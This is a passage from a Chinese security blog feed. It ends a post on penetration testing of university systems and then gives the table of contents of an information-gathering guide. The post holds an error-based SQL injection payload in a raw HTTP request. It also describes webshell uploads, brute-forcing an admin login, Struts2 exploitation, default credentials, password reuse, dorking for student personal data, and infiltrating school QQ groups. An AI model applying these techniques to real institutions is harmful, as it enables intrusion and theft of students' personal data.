class="nx">Agent</span><span class="o">:</span> <span class="nx">Mozilla</span><span class="o">/</span><span class="mf">5.0</span> <span class="p">(</span><span class="nx">Windows</span> <span class="nx">NT</span> <span class="mf">10.0</span><span class="p">;</span> <span class="nx">Win64</span><span class="p">;</span> <span class="nx">x64</span><span class="p">)</span> <span class="nx">AppleWebKit</span><span class="o">/</span><span class="mf">537.36</span> <span class="p">(</span><span class="nx">KHTML</span><span class="p">,</span> <span class="nx">like</span> <span class="nx">Gecko</span><span class="p">)</span> <span class="nx">Chrome</span><span class="o">/</span><span class="mf">84.0</span><span class="o">.</span><span class="mf">4147.105</span> <span class="nx">Safari</span><span class="o">/</span><span class="mf">537.36</span> <span class="nx">Accept</span><span class="o">:</span> <span class="nx">text</span><span class="o">/</span><span class="nx">html</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xhtml</span><span class="o">+</span><span class="nx">xml</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">xml</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="nx">image</span><span class="o">/</span><span class="nx">webp</span><span class="p">,</span><span class="nx">image</span><span class="o">/</span><span class="nx">apng</span><span class="p">,</span><span class="o">*/*</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.8</span><span class="p">,</span><span class="nx">application</span><span class="o">/</span><span class="nx">signed</span><span class="o">-</span><span class="nx">exchange</span><span class="p">;</span><span class="nx">v</span><span class="o">=</span><span class="nx">b3</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span> <span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Site</span><span class="o">:</span> <span class="nx">same</span><span class="o">-</span><span class="nx">origin</span> <span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Mode</span><span class="o">:</span> <span class="nx">navigate</span> <span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">User</span><span class="o">:</span> <span class="o">?</span><span class="mi">1</span> <span class="nx">Sec</span><span class="o">-</span><span class="nx">Fetch</span><span class="o">-</span><span class="nx">Dest</span><span class="o">:</span> <span class="nx">document</span> <span class="nx">Accept</span><span class="o">-</span><span class="nx">Encoding</span><span class="o">:</span> <span class="nx">gzip</span><span class="p">,</span> <span class="nx">deflate</span> <span class="nx">Accept</span><span class="o">-</span><span class="nx">Language</span><span class="o">:</span> <span class="nx">zh</span><span class="o">-</span><span class="nx">CN</span><span class="p">,</span><span class="nx">zh</span><span class="p">;</span><span class="nx">q</span><span class="o">=</span><span class="mf">0.9</span> <span class="nx">Cookie</span><span class="o">:</span> <span class="nx">JSESSIONID</span><span class="o">=</span><span class="nx">e9f143b9</span><span class="o">-</span><span class="mi">3</span><span class="nx">c3d</span><span class="o">-</span><span class="mi">4</span><span class="nx">acb</span><span class="o">-</span><span class="mi">96</span><span class="nx">a4</span><span class="o">-</span><span class="mi">93</span><span class="nx">c7367a98e9</span> <span class="nx">Connection</span><span class="o">:</span> <span class="nx">close</span> <span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span> <span class="nx">application</span><span class="o">/</span><span class="nx">x</span><span class="o">-</span><span class="nx">www</span><span class="o">-</span><span class="nx">form</span><span class="o">-</span><span class="nx">urlencoded</span> <span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="o">:</span> <span class="mi">75</span> <span class="nx">params</span><span class="p">[</span><span class="nx">dataScope</span><span class="p">]</span><span class="o">=</span><span class="k">and</span> <span class="nx">extractvalue</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="nx">concat</span><span class="p">(</span><span class="mh">0x7e</span><span class="p">,(</span><span class="nx">select</span> <span class="nx">database</span><span class="p">()),</span><span class="mh">0x7e</span><span class="p">))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="6fckeditor上传文件getshell" class="headerLink">
    <a href="#6fckeditor%e4%b8%8a%e4%bc%a0%e6%96%87%e4%bb%b6getshell" class="header-mark"></a>6、FCKeditor上传文件GetShell</h2><p>1、扫描目录发现存在FCKeditor目录</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666751266790-5f2d4764-4b13-4631-b1c1-42e0d6d088a7.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666751266790-5f2d4764-4b13-4631-b1c1-42e0d6d088a7.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666751266790-5f2d4764-4b13-4631-b1c1-42e0d6d088a7.png">
        
    </a></p>
<p>2、直接找到上传目录</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666751284531-abae4065-7838-4bf5-924f-8d104c2fb223.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666751284531-abae4065-7838-4bf5-924f-8d104c2fb223.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666751284531-abae4065-7838-4bf5-924f-8d104c2fb223.png">
        
    </a></p>
<p>3、上传aspx木马</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666751504910-d5285488-0339-462b-ada1-1346eaa68abf.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666751504910-d5285488-0339-462b-ada1-1346eaa68abf.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666751504910-d5285488-0339-462b-ada1-1346eaa68abf.png">
        
    </a></p>
<p>成功连接</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666784664171-01d8a4d6-e95b-46af-b8b5-327d54763a7f.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666784664171-01d8a4d6-e95b-46af-b8b5-327d54763a7f.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666784664171-01d8a4d6-e95b-46af-b8b5-327d54763a7f.png">
        
    </a></p>
<h2 id="7任意文件上传" class="headerLink">
    <a href="#7%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0" class="header-mark"></a>7、任意文件上传</h2><p>根据学校名称及域名进行编排密码本，爆破登录admin账号</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666776557415-4feb5ad0-efd9-481f-bed9-319f2b8aad15.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666776557415-4feb5ad0-efd9-481f-bed9-319f2b8aad15.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666776557415-4feb5ad0-efd9-481f-bed9-319f2b8aad15.png">
        
    </a></p>
<p>上传点任意文件上传GetShell</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666785479063-5b0d697a-e7d0-4f63-8a19-0f8101636156.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666785479063-5b0d697a-e7d0-4f63-8a19-0f8101636156.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666785479063-5b0d697a-e7d0-4f63-8a19-0f8101636156.png">
        
    </a></p>
<h2 id="8s2反序列化漏洞getshell" class="headerLink">
    <a href="#8s2%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9egetshell" class="header-mark"></a>8、S2反序列化漏洞GetShell</h2><p>1、目标网站存在S2框架</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666776108230-74b6480c-66a3-43db-b0bd-62246f03e843.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666776108230-74b6480c-66a3-43db-b0bd-62246f03e843.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666776108230-74b6480c-66a3-43db-b0bd-62246f03e843.png">
        
    </a></p>
<p>2、直接使用工具进行扫描，进而获取权限进行内网渗透</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1666776138378-0e6ce6a1-96fc-4f65-8e78-97a047dd1366.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666776138378-0e6ce6a1-96fc-4f65-8e78-97a047dd1366.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1666776138378-0e6ce6a1-96fc-4f65-8e78-97a047dd1366.png">
        
    </a></p>
<h2 id="9逻辑漏洞" class="headerLink">
    <a href="#9%e9%80%bb%e8%be%91%e6%bc%8f%e6%b4%9e" class="header-mark"></a>9、逻辑漏洞</h2><h2 id="找回密码-1" class="headerLink">
    <a href="#%e6%89%be%e5%9b%9e%e5%af%86%e7%a0%81-1" class="header-mark"></a>找回密码</h2><p>1、某站点找回密码处，短信验证码直接出现在回包中</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1668568283334-9db8b8ed-0570-4fa8-9d7f-e753cea954ee.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1668568283334-9db8b8ed-0570-4fa8-9d7f-e753cea954ee.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1668568283334-9db8b8ed-0570-4fa8-9d7f-e753cea954ee.png">
        
    </a></p>
<p>2、谷歌语法搜索 &ldquo;XX大学&rdquo; &ldquo;手机号&rdquo; filetype:xls 找到一些手机号码</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1668568792733-fc7286a9-ebae-4e11-9602-0c87472a19c0.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1668568792733-fc7286a9-ebae-4e11-9602-0c87472a19c0.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1668568792733-fc7286a9-ebae-4e11-9602-0c87472a19c0.png">
        
    </a></p>
<p>3、找回功能-修改密码-登录系统，发现是一个学校党务的测试系统</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1668568895234-da8add04-05a1-4c43-98f9-139cfd0911e2.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1668568895234-da8add04-05a1-4c43-98f9-139cfd0911e2.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1668568895234-da8add04-05a1-4c43-98f9-139cfd0911e2.png">
        
    </a></p>
<p>但其中数据是真实的，有上千份姓名、手机号、学号、身份证等信息</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1668568950748-9ca6a64a-5b21-4ed6-948b-49fa601e0749.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1668568950748-9ca6a64a-5b21-4ed6-948b-49fa601e0749.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1668568950748-9ca6a64a-5b21-4ed6-948b-49fa601e0749.png">
        
    </a></p>
<h2 id="统一门户-1" class="headerLink">
    <a href="#%e7%bb%9f%e4%b8%80%e9%97%a8%e6%88%b7-1" class="header-mark"></a>统一门户</h2><p>使用学号加身份证后六位直接登录统一服务平台</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1668569051358-6da59c9f-6c6a-4494-aff8-1e47677e8dd0.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1668569051358-6da59c9f-6c6a-4494-aff8-1e47677e8dd0.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1668569051358-6da59c9f-6c6a-4494-aff8-1e47677e8dd0.png">
        
    </a></p>
<h2 id="10geoserver弱口令" class="headerLink">
    <a href="#10geoserver%e5%bc%b1%e5%8f%a3%e4%bb%a4" class="header-mark"></a>10、geoserver弱口令</h2><p>8085端口geoserver，进入登陆页面，使用默认账号密码admin/geoserver成功登录后台。</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/attach-2b467edae299849fded88fedaab939758dc8bb10.png" title="image.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/attach-2b467edae299849fded88fedaab939758dc8bb10.png">
        
    </a></p>
<h2 id="获取数据库密码" class="headerLink">
    <a href="#%e8%8e%b7%e5%8f%96%e6%95%b0%e6%8d%ae%e5%ba%93%e5%af%86%e7%a0%81" class="header-mark"></a>获取数据库密码</h2><p>登录后进入配置页面，点击查看其中的数据存储</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1647229297688-db68488b-87b4-4ca6-b03f-5a6bfb0b5a11.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1647229297688-db68488b-87b4-4ca6-b03f-5a6bfb0b5a11.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1647229297688-db68488b-87b4-4ca6-b03f-5a6bfb0b5a11.png">
        
    </a></p>
<p>F12查看网页源代码，读取PostgreSQL密码：</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1647229765154-913dace2-7edf-4edf-9ebb-2aeb8d10e768.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1647229765154-913dace2-7edf-4edf-9ebb-2aeb8d10e768.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1647229765154-913dace2-7edf-4edf-9ebb-2aeb8d10e768.png">
        
    </a></p>
<h2 id="撞库" class="headerLink">
    <a href="#%e6%92%9e%e5%ba%93" class="header-mark"></a>撞库</h2><p>同时发现目标ip还对外开启了mysql数据库，使用root和上文获取到的密码，成功连接上。</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1647156446393-3b7082e3-a5ee-4ed2-a176-8e82d6cea89b.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1647156446393-3b7082e3-a5ee-4ed2-a176-8e82d6cea89b.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1647156446393-3b7082e3-a5ee-4ed2-a176-8e82d6cea89b.png">
        
    </a></p>
<p>在其中一个log表中发现了账号和MD5加密的密码。</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1647225840493-7f4c3375-9e80-4c8b-a4bb-1a3723692233.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1647225840493-7f4c3375-9e80-4c8b-a4bb-1a3723692233.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1647225840493-7f4c3375-9e80-4c8b-a4bb-1a3723692233.png">
        
    </a></p>
<h2 id="getshell" class="headerLink">
    <a href="#getshell" class="header-mark"></a>GetShell</h2><p>8888端口后台登录页，使用数据库中获取到的账号密码成功登录后台，发现是个金碟的系统，然后使用了文件上传漏洞，成功getshell（截图和payload有点敏感，就不放了）</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e6%95%99%e8%82%b2%e8%a1%8c%e4%b8%9a%e6%b8%97%e9%80%8f%e6%89%93%e7%82%b9/1647228656279-8ac6d1f6-ae66-4517-ac13-43aedf9b3ddc.png" title="https://www.bysec.cn/OSS/img/教育行业渗透打点/1647228656279-8ac6d1f6-ae66-4517-ac13-43aedf9b3ddc.png" data-thumbnail="https://www.bysec.cn/OSS/img/教育行业渗透打点/1647228656279-8ac6d1f6-ae66-4517-ac13-43aedf9b3ddc.png">
        
    </a></p>
<h2 id="总结" class="headerLink">
    <a href="#%e6%80%bb%e7%bb%93" class="header-mark"></a>总结：</h2><p>对于高校的渗透可以从以下几点入手</p>
<p>1、VPN弱口令，GitHub泄漏是重灾区，可以搜索&quot;学校域名&quot; &ldquo;password&rdquo;</p>
<p>2、高校的站点一般比较老旧，aspx的站点比较多，可以多关注一下SQL注入，大多数的后台都存在SQL注入。</p>
<p>3、多扫下目录，有些存在各种编辑器的漏洞，但是一些漏洞可能是伪修复了，比如说ueditor的文件上传，可能只是把参数名更换了，只要找到正确的参数名就可以继续利用。</p>
<p>4、百度谷歌高级搜索学号文件，多收集一些账号，搜集网站的使用说明文件，其中有对密码组成进行说明，如身份证后六位等，针对一些管理员的账号进行密码的编排</p>
<p>5、QQ官方群有一些敏感文件，可以使用上面搜集到的信息混入其中</p>
<p>总结起来就是多信息收集，信息收集yyds</p>]]></description>
</item><item>
    <title>万字总结信息收集全网最全</title>
    <link>https://www.bysec.cn/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/</link>
    <pubDate>Fri, 26 Apr 2024 18:19:39 &#43;0800</pubDate><author>
        <name>bysec</name>
    </author><guid>https://www.bysec.cn/%E4%B8%87%E5%AD%97%E6%80%BB%E7%BB%93%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8/</guid>
    <description><![CDATA[<blockquote>
<p><em>转载自： <a href="https://forum.butian.net/share/2841" target="_blank" rel="noopener noreferrer">https://forum.butian.net/share/2841</a></em></p>
</blockquote>
<p><strong>万字吐血总结信息收集</strong></p>
<p><a href="https://forum.butian.net/share/2841#9313-1608956864075" target="_blank" rel="noopener noreferrer">一、信息收集前言</a></p>
<p><a href="https://forum.butian.net/share/2841#1540-1608954143250" target="_blank" rel="noopener noreferrer">二、域名信息</a></p>
<p><a href="https://forum.butian.net/share/2841#6482-1608952975074" target="_blank" rel="noopener noreferrer">1、Whois查询</a></p>
<p><a href="https://forum.butian.net/share/2841#6626-1608954528325" target="_blank" rel="noopener noreferrer">1.1、站长之家</a></p>
<p><a href="https://forum.butian.net/share/2841#5826-1609522517663" target="_blank" rel="noopener noreferrer">1.2、爱站</a></p>
<p><a href="https://forum.butian.net/share/2841#8290-1608955028908" target="_blank" rel="noopener noreferrer">1.3、微步</a></p>
<p><a href="https://forum.butian.net/share/2841#5081-1608954609305" target="_blank" rel="noopener noreferrer">1.4、国外的who.is</a></p>
<p><a href="https://forum.butian.net/share/2841#7799-1608955238665" target="_blank" rel="noopener noreferrer">1.5、阿里云域名信息查询</a></p>
<p><a href="https://forum.butian.net/share/2841#7847-1609321094615" target="_blank" rel="noopener noreferrer">1.6、腾讯查询</a></p>
<p><a href="https://forum.butian.net/share/2841#6619-1609601548665" target="_blank" rel="noopener noreferrer">1.7、中国互联网信息中心</a></p>
<p><a href="https://forum.butian.net/share/2841#1070-1609150295487" target="_blank" rel="noopener noreferrer">2、ICP(Internet Content Provider)备案查询</a></p>
<p><a href="https://forum.butian.net/share/2841#4328-1608957113762" target="_blank" rel="noopener noreferrer">2.1、国家企业信用信息公示系统</a></p>
<p><a href="https://forum.butian.net/share/2841#2762-1608957274017" target="_blank" rel="noopener noreferrer">2.2、ICP备案查询网</a></p>
<p><a href="https://forum.butian.net/share/2841#7362-1608957345470" target="_blank" rel="noopener noreferrer">2.3、ICP备案查询 - 站长工具</a></p>
<p><a href="https://forum.butian.net/share/2841#7985-1608957511174" target="_blank" rel="noopener noreferrer">2.4、天眼查</a></p>
<p><a href="https://forum.butian.net/share/2841#5774-1608957266603" target="_blank" rel="noopener noreferrer">2.5、企查查</a></p>
<p><a href="https://forum.butian.net/share/2841#2641-1608957035834" target="_blank" rel="noopener noreferrer">3、SEO(Search Engine Optimization)查询</a></p>
<p><a href="https://forum.butian.net/share/2841#4489-1608958353806" target="_blank" rel="noopener noreferrer">3.1、爱站-SEO综合查询</a></p>
<p><a href="https://forum.butian.net/share/2841#2085-1608958243261" target="_blank" rel="noopener noreferrer">3.2、站长-SEO综合查询</a></p>
<p><a href="https://forum.butian.net/share/2841#4377-1608958615406" target="_blank" rel="noopener noreferrer">4、历史漏洞</a></p>
<p><a href="https://forum.butian.net/share/2841#4549-1608994973094" target="_blank" rel="noopener noreferrer">4.1、乌云漏洞库</a></p>
<p><a href="https://forum.butian.net/share/2841#6739-1608994952697" target="_blank" rel="noopener noreferrer">5、Google Hacking</a></p>
<p><a href="https://forum.butian.net/share/2841#1562-1609132494362" target="_blank" rel="noopener noreferrer">5.1、intext:后台管理</a></p>
<p><a href="https://forum.butian.net/share/2841#4067-1609132494362" target="_blank" rel="noopener noreferrer">5.2、intitle：管理登录</a></p>
<p><a href="https://forum.butian.net/share/2841#5125-1609132494362" target="_blank" rel="noopener noreferrer">5.3、filetype:pdf</a></p>
<p><a href="https://forum.butian.net/share/2841#2626-1609132494362" target="_blank" rel="noopener noreferrer">5.4、inurl: php?id=</a></p>
<p><a href="https://forum.butian.net/share/2841#6099-1609132494362" target="_blank" rel="noopener noreferrer">5.5、site：baidu.com</a></p>
<p><a href="https://forum.butian.net/share/2841#2526-1609142599574" target="_blank" rel="noopener noreferrer">5.6、filetype：pdf site:baidu.com</a></p>
<p><a href="https://forum.butian.net/share/2841#4070-1609132494362" target="_blank" rel="noopener noreferrer">6、Github</a></p>
<p><a href="https://forum.butian.net/share/2841#6248-1609000172175" target="_blank" rel="noopener noreferrer">7、维基和百度百科</a></p>
<p><a href="https://forum.butian.net/share/2841#2752-1609143904790" target="_blank" rel="noopener noreferrer">8、网络空间搜索引擎</a></p>
<p><a href="https://forum.butian.net/share/2841#8628-1608994952900" target="_blank" rel="noopener noreferrer">8.1、Fofa</a></p>
<p><a href="https://forum.butian.net/share/2841#7827-1608995508166" target="_blank" rel="noopener noreferrer">8.2、Shodan</a></p>
<p><a href="https://forum.butian.net/share/2841#1356-1608995559459" target="_blank" rel="noopener noreferrer">8.3、Zoomeye(钟馗之眼)</a></p>
<p><a href="https://forum.butian.net/share/2841#4049-1608995592030" target="_blank" rel="noopener noreferrer">8.4、Spyse</a></p>
<p><a href="https://forum.butian.net/share/2841#8054-1609090002560" target="_blank" rel="noopener noreferrer">8.5、Censys</a></p>
<p><a href="https://forum.butian.net/share/2841#9669-1611813877072" target="_blank" rel="noopener noreferrer">9、REG007</a></p>
<p><a href="https://forum.butian.net/share/2841#3621-1608994953076" target="_blank" rel="noopener noreferrer">二、APP、小程序、公众号信息收集</a></p>
<p><a href="https://forum.butian.net/share/2841#7068-1608993351034" target="_blank" rel="noopener noreferrer">1、APP信息搜集</a></p>
<p><a href="https://forum.butian.net/share/2841#7710-1608993411291" target="_blank" rel="noopener noreferrer">1.1、七麦数据</a></p>
<p><a href="https://forum.butian.net/share/2841#2775-1608993545897" target="_blank" rel="noopener noreferrer">1.2、AppStore(安卓和IOS)</a></p>
<p><a href="https://forum.butian.net/share/2841#3067-1608993411485" target="_blank" rel="noopener noreferrer">2、微信公众号和小程序</a></p>
<p><a href="https://forum.butian.net/share/2841#5930-1609143632016" target="_blank" rel="noopener noreferrer">4、logo</a></p>
<p><a href="https://forum.butian.net/share/2841#4627-1608993411642" target="_blank" rel="noopener noreferrer">5、favicon.ico</a></p>
<p><a href="https://forum.butian.net/share/2841#1925-1608957036106" target="_blank" rel="noopener noreferrer">三、子域名收集(挖掘)</a></p>
<p><a href="https://forum.butian.net/share/2841#4380-1609090650925" target="_blank" rel="noopener noreferrer">1、SSL(HTTPS)证书</a></p>
<p><a href="https://forum.butian.net/share/2841#1020-1609128666117" target="_blank" rel="noopener noreferrer">1.1、大厂商SSL证书一证多用</a></p>
<p><a href="https://forum.butian.net/share/2841#2835-1609090650925" target="_blank" rel="noopener noreferrer">1.2、HTTPS证书错误泄露域名</a></p>
<p><a href="https://forum.butian.net/share/2841#5294-1609128697253" target="_blank" rel="noopener noreferrer">1.3、在线网站证书查询</a></p>
<p><a href="https://forum.butian.net/share/2841#4998-1609090650925" target="_blank" rel="noopener noreferrer">2、网络深度爬虫</a></p>
<p><a href="https://forum.butian.net/share/2841#7223-1609090925111" target="_blank" rel="noopener noreferrer">3、域传送漏洞</a></p>
<p><a href="https://forum.butian.net/share/2841#1072-1609090925111" target="_blank" rel="noopener noreferrer">3.1、常用DNS记录</a></p>
<p><a href="https://forum.butian.net/share/2841#9085-1609090925111" target="_blank" rel="noopener noreferrer">3.2、DNS区域传送</a></p>
<p><a href="https://forum.butian.net/share/2841#3265-1609090925111" target="_blank" rel="noopener noreferrer">3.3、域传送漏洞</a></p>
<p><a href="https://forum.butian.net/share/2841#1183-1609090925111" target="_blank" rel="noopener noreferrer">3.4、检测</a></p>
<p><a href="https://forum.butian.net/share/2841#3644-1609090862170" target="_blank" rel="noopener noreferrer">4、在线DNS数据</a></p>
<p><a href="https://forum.butian.net/share/2841#4819-1609091002762" target="_blank" rel="noopener noreferrer">4.1、VirusTotal</a></p>
<p><a href="https://forum.butian.net/share/2841#6528-1609091002762" target="_blank" rel="noopener noreferrer">4.2、DNSdumpster</a></p>
<p><a href="https://forum.butian.net/share/2841#5960-1609149395775" target="_blank" rel="noopener noreferrer">4.2、dnsdb</a></p>
<p><a href="https://forum.butian.net/share/2841#4068-1609091082152" target="_blank" rel="noopener noreferrer">5、自身泄漏</a></p>
<p><a href="https://forum.butian.net/share/2841#8760-1609091082152" target="_blank" rel="noopener noreferrer">6、Github泄露</a></p>
<p><a href="https://forum.butian.net/share/2841#4387-1609090862561" target="_blank" rel="noopener noreferrer">7、Google Hacking</a></p>
<p><a href="https://forum.butian.net/share/2841#5190-1609144245688" target="_blank" rel="noopener noreferrer">8、在线子域名查询</a></p>
<p><a href="https://forum.butian.net/share/2841#7195-1609090862754" target="_blank" rel="noopener noreferrer">9、子域名枚举爆破</a></p>
<p><a href="https://forum.butian.net/share/2841#2064-1608958948229" target="_blank" rel="noopener noreferrer">9.1、OneForAll</a></p>
<p><a href="https://forum.butian.net/share/2841#8223-1608979107978" target="_blank" rel="noopener noreferrer">9.2、subDomainBrute</a></p>
<p><a href="https://forum.butian.net/share/2841#6550-1608981342591" target="_blank" rel="noopener noreferrer">9.3、Layer</a></p>
<p><a href="https://forum.butian.net/share/2841#3987-1608982931914" target="_blank" rel="noopener noreferrer">9.4、FuzSub</a></p>
<p><a href="https://forum.butian.net/share/2841#2688-1608956009770" target="_blank" rel="noopener noreferrer">9.5、Fierce</a></p>
<p><a href="https://forum.butian.net/share/2841#1849-1609522810625" target="_blank" rel="noopener noreferrer">9.6、御剑</a></p>
<p><a href="https://forum.butian.net/share/2841#3722-1609600384813" target="_blank" rel="noopener noreferrer">9.7、wydomain</a></p>
<p><a href="https://forum.butian.net/share/2841#5955-1609601438779" target="_blank" rel="noopener noreferrer">9.8、orangescan</a></p>
<p><a href="https://forum.butian.net/share/2841#1670-1609601463470" target="_blank" rel="noopener noreferrer">9.9、DNSRecon</a></p>
<p><a href="https://forum.butian.net/share/2841#1149-1609601477005" target="_blank" rel="noopener noreferrer">9.10、K8</a></p>
<p><a href="https://forum.butian.net/share/2841#5028-1608955925899" target="_blank" rel="noopener noreferrer">四、IP信息收集</a></p>
<p><a href="https://forum.butian.net/share/2841#1747-1608955824768" target="_blank" rel="noopener noreferrer">1、CDN概念</a></p>
<p><a href="https://forum.butian.net/share/2841#8035-1608955824768" target="_blank" rel="noopener noreferrer">2、判断是否真实IP</a></p>
<p><a href="https://forum.butian.net/share/2841#1167-1608955824768" target="_blank" rel="noopener noreferrer">2.1、nslookup</a></p>
<p><a href="https://forum.butian.net/share/2841#1490-1609523033042" target="_blank" rel="noopener noreferrer">2.2、多地ping</a></p>
<p><a href="https://forum.butian.net/share/2841#2282-1608955824768" target="_blank" rel="noopener noreferrer">2.3、IP反查</a></p>
<p><a href="https://forum.butian.net/share/2841#7660-1608955824768" target="_blank" rel="noopener noreferrer">3、绕CDN找真实IP</a></p>
<p><a href="https://forum.butian.net/share/2841#3665-1608955824768" target="_blank" rel="noopener noreferrer">3.1、子域名</a></p>
<p><a href="https://forum.butian.net/share/2841#5845-1608955824768" target="_blank" rel="noopener noreferrer">3.2、历史DNS解析记录</a></p>
<p><a href="https://forum.butian.net/share/2841#2254-1608955824768" target="_blank" rel="noopener noreferrer">3.3、邮件服务器</a></p>
